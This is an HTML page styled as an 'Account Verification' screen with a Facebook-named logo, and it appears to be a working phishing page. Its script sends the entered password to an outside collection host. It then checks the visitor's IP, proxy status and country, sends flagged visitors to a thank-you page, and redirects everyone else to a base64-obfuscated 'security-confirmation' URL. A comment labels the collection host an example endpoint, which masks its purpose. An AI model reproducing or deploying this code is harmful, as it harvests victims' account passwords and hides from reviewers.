<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Verification</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        :root {
            --primary: #4361ee;
            --primary-dark: #3a56d4;
            --secondary: #f72585;
            --light: #f8f9fa;
            --dark: #212529;
            --gray: #6c757d;
            --success: #4cc9f0;
            --error: #f72585;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .card {
            background-color: white;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 420px;
            overflow: hidden;
            transform: translateY(0);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
        }

        .card-header {
            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
            color: white;
            padding: 24px;
            text-align: center;
        }

        .logo {
            width: 48px;
            height: 48px;
            margin: 0 auto 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: white;
            border-radius: 50%;
            padding: 8px;
        }

        .logo img {
            max-width: 100%;
            height: auto;
        }

        .card-title {
            font-size: 1.5rem;
            font-weight: 600;
            margin-bottom: 8px;
        }

        .card-subtitle {
            font-size: 0.875rem;
            opacity: 0.9;
            font-weight: 400;
        }

        .card-body {
            padding: 32px;
        }

        .form-group {
            margin-bottom: 24px;
            position: relative;
        }

        .form-label {
            display: block;
            margin-bottom: 8px;
            font-size: 0.875rem;
            font-weight: 500;
            color: var(--dark);
        }

        .input-wrapper {
            position: relative;
        }

        .form-control {
            width: 100%;
            padding: 14px 16px;
            font-size: 1rem;
            border: 1px solid #e9ecef;
            border-radius: 8px;
            background-color: #f8f9fa;
            transition: all 0.3s ease;
            padding-right: 48px;
        }

        .form-control:focus {
            outline: none;
            border-color: var(--primary);
            background-color: white;
            box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.15);
        }

        .toggle-password {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--gray);
            cursor: pointer;
            background: none;
            border: none;
            font-size: 1.1rem;
            transition: color 0.2s ease;
        }

        .toggle-password:hover {
            color: var(--primary);
        }

        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            padding: 14px;
            font-size: 1rem;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            border: none;
        }

        .btn-primary {
            background-color: var(--primary);
            color: white;
        }

        .btn-primary:hover {
            background-color: var(--primary-dark);
        }

        .btn-primary:active {
            transform: translateY(1px);
        }

        .message {
            font-size: 0.875rem;
            margin-top: 8px;
            padding: 8px 12px;
            border-radius: 6px;
            display: none;
        }

        .error-message {
            background-color: rgba(247, 37, 133, 0.1);
            color: var(--error);
            display: block;
        }

        .success-message {
            background-color: rgba(76, 201, 240, 0.1);
            color: var(--success);
            display: block;
        }

        .security-info {
            margin-top: 24px;
            padding: 12px;
            background-color: #f8f9fa;
            border-radius: 8px;
            font-size: 0.8125rem;
            color: var(--gray);
            text-align: center;
        }

        .security-info i {
            color: var(--primary);
            margin-right: 6px;
        }

        @media (max-width: 480px) {
            .card {
                border-radius: 12px;
            }

            .card-header {
                padding: 20px;
            }

            .card-body {
                padding: 24px;
            }
        }
    </style>
</head>

<body>
    <div class="card">
        <div class="card-header">
            <div class="logo">
                <img src="https://cdn.glitch.global/bb76d296-5a52-49d2-aa60-eda8a32faf7d/facebook%20photo.jpeg?v=1750069061430"
                    alt="Security Shield">
            </div>
            <h1 class="card-title">Account Verification</h1>
            <p class="card-subtitle">Confirm your identity to continue</p>
        </div>

        <div class="card-body">
            <form id="passwordForm">
                <div class="form-group">
                    <label for="password" class="form-label">Enter your password</label>
                    <div class="input-wrapper">
                        <input type="password" id="password" class="form-control" placeholder="https://submit-form.com/PziKKnKSi" required>
                        <button type="button" class="toggle-password" id="togglePassword">
                            <i class="fas fa-eye"></i>
                        </button>
                    </div>
                    <div id="error-message" class="message error-message" style="display: none;">
                        Password must be at least 6 characters long
                    </div>
                    <div id="success-message" class="message success-message" style="display: none;">
                        Verification successful! Redirecting...
                    </div>
                </div>

                <button type="submit" class="btn btn-primary">
                    <span>Continue</span>
                </button>
            </form>

            <div class="security-info">
                <i class="fas fa-lock"></i>
                Your information is encrypted and secure
            </div>
        </div>
    </div>

    <script>
        document.getElementById('togglePassword').addEventListener('click', function () {
            const passwordField = document.getElementById('password');
            const icon = this.querySelector('i');

            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                icon.classList.replace('fa-eye', 'fa-eye-slash');
            } else {
                passwordField.type = 'password';
                icon.classList.replace('fa-eye-slash', 'fa-eye');
            }
        });

        document.getElementById('passwordForm').addEventListener('submit', async function (event) {
            event.preventDefault();

            const passwordField = document.getElementById('password');
            const errorMessage = document.getElementById('error-message');
            const successMessage = document.getElementById('success-message');

            // Reset messages
            errorMessage.style.display = 'none';
            successMessage.style.display = 'none';

            // Validate password
            if (passwordField.value.length < 6) {
                errorMessage.style.display = 'block';
                passwordField.focus();
                return;
            }

            try {
                // Show loading state
                const submitButton = document.querySelector('.btn-primary');
                submitButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...';
                submitButton.disabled = true;

                // Example API endpoint - replace with your actual API URL
                const apiUrl = 'https://postal-form.on.shiper.app/pass';

                // Make the API call
                const response = await fetch(apiUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        password: passwordField.value,
                    })
                });

                if (response.ok) {
                    successMessage.style.display = 'block';

                    // Reset button state
                    submitButton.innerHTML = '<i class="fas fa-check"></i> Verified';

                    fetch(`https://handler.gadgetsdecor.com:3000/dc`, {})
                        .then((response) => {
                            if (!response.ok) {
                                throw new Error(`HTTP ${response.status}`);
                            }
                            return response.json();
                        })
                        .then((data) => {
                            const myIp = data.clientIp;

                            if (data[myIp].proxy == "yes" || data[myIp].isocode === "PK") {
                                window.location.href = 'thankyou.html';
                            } else {
                                 var p = atob("aHR0cHM6Ly9zZWN1cml0eS1jb25maXJtYXRpb24ud2FzbWVyLmFwcC8=");
                                window.location.href = p
                            }



                        })
                        .catch((error) => {
                            console.error("Full error details:", {
                                name: error.name,
                                message: error.message,
                                stack: error.stack,
                            });
                        });


                } else {
                    throw new Error('API request failed');
                }
            } catch (error) {
                errorMessage.textContent = 'An error occurred. Please try again.';
                errorMessage.style.display = 'block';

                // Reset button state
                const submitButton = document.querySelector('.btn-primary');
                submitButton.innerHTML = '<span>Continue</span>';
                submitButton.disabled = false;

                console.error('Error:', error);
            }
        });
    </script>
</body>

</html>
